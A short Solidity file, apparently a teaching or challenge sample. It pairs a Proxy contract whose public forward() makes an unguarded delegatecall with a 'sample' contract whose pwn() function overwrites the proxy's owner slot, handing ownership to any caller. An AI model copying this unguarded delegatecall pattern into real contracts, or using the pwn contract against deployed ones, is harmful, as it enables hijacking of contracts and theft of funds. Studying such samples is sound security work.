contract Proxy {

  address owner;

  constructor() public {
    owner = msg.sender;  
  }

  function forward(address callee, bytes _data) public {
    require(callee.delegatecall(_data));
  }

}


contract sample{
    
    address owner;
    
    function sample(address _owner) {
        owner = _owner;
    }
    
    function pwn(){
        owner = msg.sender;
    }
    
    function retOwner() public returns(address){
        return owner;
    }
}
